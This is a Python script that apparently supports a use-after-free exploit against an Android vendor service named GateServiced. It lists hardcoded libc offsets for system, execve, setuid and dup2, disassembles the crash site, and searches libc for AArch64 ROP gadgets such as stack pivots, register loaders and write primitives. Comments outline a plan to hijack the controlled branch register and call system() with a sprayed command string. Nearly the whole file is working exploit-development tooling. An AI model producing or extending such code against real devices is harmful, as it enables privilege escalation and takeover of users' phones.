#!/usr/bin/env python3
"""
Extract libc.so offsets and ROP gadgets for GateServiced UAF exploit.
Uses llvm-objdump to disassemble and search for useful gadget patterns.
"""
import subprocess
import re
import struct
import os

NDK_BIN = r"C:\Users\<USER>\AppData\Local\Android\Sdk\ndk\29.0.14206865\toolchains\llvm\prebuilt\windows-x86_64\bin"
LIBC_PATH = r"extracted_bins\libc.so"
GATE_PATH = r"vendor_extracted\bin\GateServiced"

# ============================================================
# Part 1: Key function offsets (already found, just confirm)
# ============================================================
OFFSETS = {
    "system":   0x9cbd0,
    "execve":   0xda7c0,
    "mprotect": 0xdade0,
    "exit":     0xe44f4,
    "_exit":    0xdbf00,
    "setuid":   0xda980,
    "setgid":   0xda960,
    "dup2":     0x8d17c,
}

print("=" * 60)
print("LIBC.SO FUNCTION OFFSETS (from dynamic symbols)")
print("=" * 60)
for name, off in OFFSETS.items():
    print(f"  {name:20s} = 0x{off:08x}")

# ============================================================
# Part 2: Disassemble around system() to understand prologue
# ============================================================
print("\n" + "=" * 60)
print("DISASSEMBLY: system() @ 0x9cbd0")
print("=" * 60)

def disasm_range(binary, start, length, label=""):
    """Disassemble a range of the binary."""
    cmd = [
        os.path.join(NDK_BIN, "llvm-objdump.exe"),
        "-d",
        f"--start-address=0x{start:x}",
        f"--stop-address=0x{start + length:x}",
        binary
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return result.stdout

# Disassemble system()
sys_disasm = disasm_range(LIBC_PATH, 0x9cbd0, 0x280, "system")
print(sys_disasm[-2000:] if len(sys_disasm) > 2000 else sys_disasm)

# ============================================================
# Part 3: Disassemble GateServiced crash site (BLR X11 @ 0x2DC4)
# ============================================================
print("\n" + "=" * 60)
print("DISASSEMBLY: GateServiced run_exec_cmd_ta around BLR X11")
print("=" * 60)

# Disassemble around the crash site: 0x2D00 - 0x2E40
gate_disasm = disasm_range(GATE_PATH, 0x2C00, 0x300, "run_exec_cmd_ta")
print(gate_disasm[-3000:] if len(gate_disasm) > 3000 else gate_disasm)

# ============================================================
# Part 4: Search for ROP gadgets in libc.so
# We need specific patterns for AArch64:
#   - LDP x29, x30, [sp], #N ; RET  (function epilogue, controls LR)
#   - MOV X0, Xn ; BLR Xm (argument setup + indirect call)
#   - LDP X19, X20, [SP, #offset] ; ... ; RET (register control)
#   - STR/STP patterns that write to controlled memory
# ============================================================
print("\n" + "=" * 60)
print("SEARCHING FOR ROP GADGETS IN LIBC.SO")
print("=" * 60)

# Full disassembly (this may take a moment)
print("[*] Full disassembly of libc.so (text section)...")
cmd = [
    os.path.join(NDK_BIN, "llvm-objdump.exe"),
    "-d",
    "--no-show-raw-insn",
    LIBC_PATH
]
result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
lines = result.stdout.split('\n')
print(f"[*] Total disassembly lines: {len(lines)}")

# Parse into (addr, instr) pairs
insns = []
for line in lines:
    m = re.match(r'\s+([0-9a-f]+):\s+(.+)', line)
    if m:
        addr = int(m.group(1), 16)
        instr = m.group(2).strip()
        insns.append((addr, instr))

print(f"[*] Total instructions parsed: {len(insns)}")

# Search for gadgets
gadgets_found = {
    "mov_x0_then_blr": [],      # MOV X0, Xn ; BLR Xm
    "ldp_ret": [],               # LDP x29,x30,[sp],#N ; RET
    "ldp_x19_x20_ret": [],       # LDP X19,X20,[SP,#off] ; ... ; RET
    "system_ptr": [],             # Any reference to system offset
    "stack_pivot": [],            # MOV SP, Xn or ADD SP, Xn
    "str_x0_ret": [],             # STR X0, [Xn] ; RET (write primitive)
}

for i in range(len(insns) - 3):
    addr, instr = insns[i]
    instr_lower = instr.lower()
    
    # Pattern 1: MOV X0, Xn followed by BLR Xm within 4 instructions
    if re.match(r'mov\s+x0,\s+x\d+', instr_lower):
        for j in range(i+1, min(i+5, len(insns))):
            next_instr = insns[j][1].lower()
            if re.match(r'blr\s+x\d+', next_instr):
                gadgets_found["mov_x0_then_blr"].append(
                    (addr, f"0x{addr:x}: {instr} ... 0x{insns[j][0]:x}: {insns[j][1]}")
                )
                break
            if re.match(r'ret', next_instr):
                break
    
    # Pattern 2: LDP X29, X30, [SP], #N ; RET
    if re.match(r'ldp\s+x29,\s+x30,\s+\[sp\]', instr_lower):
        for j in range(i+1, min(i+3, len(insns))):
            if re.match(r'ret', insns[j][1].lower()):
                gadgets_found["ldp_ret"].append(
                    (addr, f"0x{addr:x}: {instr} ; 0x{insns[j][0]:x}: {insns[j][1]}")
                )
                break
    
    # Pattern 3: LDP X19, X20 from SP
    if re.match(r'ldp\s+x19,\s+x20,\s+\[sp', instr_lower):
        # Check if followed by LDP X29,X30 and RET within 5 insns
        for j in range(i+1, min(i+6, len(insns))):
            if re.match(r'ret', insns[j][1].lower()):
                chain = " ; ".join([f"{insns[k][1]}" for k in range(i, j+1)])
                gadgets_found["ldp_x19_x20_ret"].append(
                    (addr, f"0x{addr:x}: {chain}")
                )
                break
    
    # Pattern 4: Stack pivot (MOV SP, Xn)
    if re.match(r'mov\s+sp,\s+x\d+', instr_lower):
        gadgets_found["stack_pivot"].append(
            (addr, f"0x{addr:x}: {instr}")
        )
    
    # Pattern 5: STR X0, [Xn] near RET
    if re.match(r'str\s+x0,\s+\[x\d+\]', instr_lower):
        for j in range(i+1, min(i+4, len(insns))):
            if re.match(r'ret', insns[j][1].lower()):
                gadgets_found["str_x0_ret"].append(
                    (addr, f"0x{addr:x}: {instr} ; 0x{insns[j][0]:x}: ret")
                )
                break

# Print results
for category, gadgets in gadgets_found.items():
    print(f"\n--- {category} ({len(gadgets)} found) ---")
    # Show first 10 of each category
    for addr, desc in gadgets[:10]:
        print(f"  {desc}")
    if len(gadgets) > 10:
        print(f"  ... and {len(gadgets) - 10} more")

# ============================================================
# Part 5: Specific gadget search for our exploit strategy
# ============================================================
print("\n" + "=" * 60)
print("EXPLOIT-SPECIFIC GADGET SEARCH")
print("=" * 60)

# For Strategy B (direct system call):
# At BLR X11, if X0 already points to our spray data containing
# a command string, we could point X11 directly at system().
# But we need to know what X0 contains at crash time.
#
# From crash dump:
#   x0  = ??? (need to check from logcat)
#   x10 = 0xb400006f9921c030 (the freed app_obj pointer)
#   x11 = loaded from app_obj (our control)
#
# If X0 is NOT our string, we need a gadget:
#   MOV X0, X10 ; BLR X11  -- but X11 is the jump target, so this
#   won't help directly.
#
# Better: We search for gadgets that:
#   1. Set X0 from a register we control
#   2. Then call system() or jump to a known address

# Search for: MOV X0, X10 ; ... ; RET  (X10 = app_obj pointer)
print("\n[*] Gadgets using X10 (app_obj pointer):")
for addr, instr in insns:
    if re.match(r'mov\s+x0,\s+x10', instr.lower()):
        # Find next few instructions
        idx = next((i for i, (a, _) in enumerate(insns) if a == addr), None)
        if idx:
            snippet = insns[idx:idx+6]
            formatted = " ; ".join([f"{ins}" for _, ins in snippet])
            print(f"  0x{addr:x}: {formatted}")
            if len([1 for _, ins in snippet if 'ret' in ins.lower() or 'blr' in ins.lower()]) > 0:
                break

# Search for gadget at specific pattern: LDR X0, [X10, #offset]; ... BLR/RET
print("\n[*] Gadgets loading from X10 (dereference app_obj):")
x10_load_count = 0
for i, (addr, instr) in enumerate(insns):
    if re.match(r'ldr\s+x0,\s+\[x10', instr.lower()):
        snippet = insns[i:i+4]
        formatted = " ; ".join([f"{ins}" for _, ins in snippet])
        has_ret = any('ret' in ins.lower() or 'blr' in ins.lower() for _, ins in snippet)
        if has_ret:
            print(f"  0x{addr:x}: {formatted}")
            x10_load_count += 1
            if x10_load_count >= 10:
                break

print("\n" + "=" * 60)
print("SUMMARY OF CRITICAL OFFSETS FOR EXPLOIT")
print("=" * 60)
print(f"  system()    = 0x{OFFSETS['system']:08x}")
print(f"  execve()    = 0x{OFFSETS['execve']:08x}")
print(f"  mprotect()  = 0x{OFFSETS['mprotect']:08x}")
print(f"  exit()      = 0x{OFFSETS['exit']:08x}")
print(f"  setuid(0)   = 0x{OFFSETS['setuid']:08x}")
print(f"  setgid(0)   = 0x{OFFSETS['setgid']:08x}")

# libc base from crash backtrace: __pthread_start+264 @ 0xefca4
# So if runtime __pthread_start+264 address is known, libc_base = runtime_addr - 0xefca4
print(f"\n  __pthread_start+264 offset = 0xefca4")
print(f"  __start_thread+68 offset = 0x8c57c")
